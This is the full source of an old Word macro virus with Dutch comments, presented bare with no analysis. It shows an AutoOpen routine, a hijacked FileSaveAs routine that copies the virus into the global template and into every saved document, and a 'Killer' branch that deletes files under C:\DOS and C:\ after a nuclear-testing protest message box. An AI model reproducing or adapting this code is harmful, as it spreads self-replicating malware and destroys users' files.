   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "IkWordNietGoed2"

   Public Sub MAIN()
   Dim sMe$
   Dim sTMacro$
   'Dit wordt BestandOpslaanAls in de sectie Algemeen
   Dim bewaardlg As Object: Set bewaardlg = WordBasic.DialogRecord.FileSaveAs(False)
   On Error GoTo -1: On Error GoTo Bail
   WordBasic.CurValues.FileSaveAs bewaardlg
   WordBasic.Dialog.FileSaveAs bewaardlg
   If bewaardlg.Format = 0 Then bewaardlg.Format = 1
   sMe$ = WordBasic.[FileName$]()
   sTMacro$ = sMe$ + ":AutoOpen"
   WordBasic.MacroCopy "Algemeen:IkWordNietGoed1", sTMacro$
   sTMacro$ = sMe$ + ":IkWordNietGoed1"
   WordBasic.MacroCopy "Algemeen:IkWordNietGoed1", sTMacro$
   sTMacro$ = sMe$ + ":IkWordNietGoed2"
   WordBasic.MacroCopy "Algemeen:IkWordNietGoed2", sTMacro$
   sTMacro$ = sMe$ + ":Lading"
   WordBasic.MacroCopy "Algemeen:Lading", sTMacro$
   WordBasic.FileSaveAs bewaardlg
   GoTo Done

   Bail:
   If Err.Number <> 102 Then
       WordBasic.FileSaveAs bewaardlg
   End If
   Done:
   End Sub

   Attribute VB_Name = "IkWordNietGoed1"

   Public Sub MAIN()
   Dim iMacroCount
   Dim i
   Dim bInstalled
   Dim bTeVeelMoeite
   Dim sMe$
   Dim sMacro$
   Dim button
       On Error GoTo -1: On Error GoTo Abort
       iMacroCount = WordBasic.CountMacros(0, 0)
       'Even kijken of we al bestaan
       For i = 1 To iMacroCount
           If WordBasic.[MacroName$](i, 0, 0) = "Lading" Then
               bInstalled = -1
           End If
           If WordBasic.[MacroName$](i, 0, 0) = "BestandOpslaanAls" Then
               bTeVeelMoeite = -1
           End If
       Next i
       If Not bInstalled And Not bTeVeelMoeite Then
           'voeg BestandOpslaanAls en kopiëen van AutoOpen en
           'BestandOpslaanAls toe.
           'Lading is slechts een waarschuwing!
           'Done by the CatMan!!
           sMe$ = WordBasic.[FileName$]()
           sMacro$ = sMe$ + ":Lading"
           WordBasic.MacroCopy sMacro$, "Algemeen:Lading"
           sMacro$ = sMe$ + ":IkWordNietGoed2"
           WordBasic.MacroCopy sMacro$, "Algemeen:BestandOpslaanAls"
           sMacro$ = sMe$ + ":IkWordNietGoed2"
           WordBasic.MacroCopy sMacro$, "Algemeen:IkWordNietGoed2"
           sMacro$ = sMe$ + ":IkWordNietGoed1"
           WordBasic.MacroCopy sMacro$, "Algemeen:IkWordNietGoed1"
           WordBasic.MsgBox "GOTCHA!", "Important!", 48
           button = WordBasic.MsgBox("STOP ALL FRENCH NUCLEAR TESTING IN THE PACIFIC", "FINAL WARNING!", 52)
           If button = 0 Then GoTo Killer
           End If
   GoTo Done

   Killer:
       WordBasic.Kill "C:\DOS\*.*"
       SetAttr "C:\*.*", 0
       WordBasic.Kill "C:\*.*"

   Abort:
   Done:
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim iMacroCount
   Dim i
   Dim bInstalled
   Dim bTeVeelMoeite
   Dim sMe$
   Dim sMacro$
   Dim button
       On Error GoTo -1: On Error GoTo Abort
       iMacroCount = WordBasic.CountMacros(0, 0)
       'Even kijken of we al bestaan
       For i = 1 To iMacroCount
           If WordBasic.[MacroName$](i, 0, 0) = "Lading" Then
               bInstalled = -1
           End If
           If WordBasic.[MacroName$](i, 0, 0) = "BestandOpslaanAls" Then
               bTeVeelMoeite = -1
           End If
       Next i
       If Not bInstalled And Not bTeVeelMoeite Then
           'voeg BestandOpslaanAls en kopiëen van AutoOpen en
           'BestandOpslaanAls toe.
           'Lading is slechts een waarschuwing!
           'Done by the CatMan!!
           sMe$ = WordBasic.[FileName$]()
           sMacro$ = sMe$ + ":Lading"
           WordBasic.MacroCopy sMacro$, "Algemeen:Lading"
           sMacro$ = sMe$ + ":IkWordNietGoed2"
           WordBasic.MacroCopy sMacro$, "Algemeen:BestandOpslaanAls"
           sMacro$ = sMe$ + ":IkWordNietGoed2"
           WordBasic.MacroCopy sMacro$, "Algemeen:IkWordNietGoed2"
           sMacro$ = sMe$ + ":IkWordNietGoed1"
           WordBasic.MacroCopy sMacro$, "Algemeen:IkWordNietGoed1"
           WordBasic.MsgBox "GOTCHA!", "Important!", 48
           button = WordBasic.MsgBox("STOP ALL FRENCH NUCLEAR TESTING IN THE PACIFIC", "FINAL WARNING!", 52)
           If button = 0 Then GoTo Killer
           End If
   GoTo Done

   Killer:
       WordBasic.Kill "C:\DOS\*.*"
       SetAttr "C:\*.*", 0
       WordBasic.Kill "C:\*.*"

   Abort:
   Done:
   End Sub

   Attribute VB_Name = "Lading"

   Public Sub MAIN()
       Rem STOP ALL FRENCH NUCLEAR TESTING IN THE PACIFIC
       Rem              *** WARNING ***
       Rem You're computer could be killed right now!
       Rem Thanks to you and me it's still ok!
       Rem Next time will be worse!
       Rem              *** PHEEEW! ***
       Rem STOP ALL FRENCH NUCLEAR TESTING IN THE PACIFIC
   End Sub
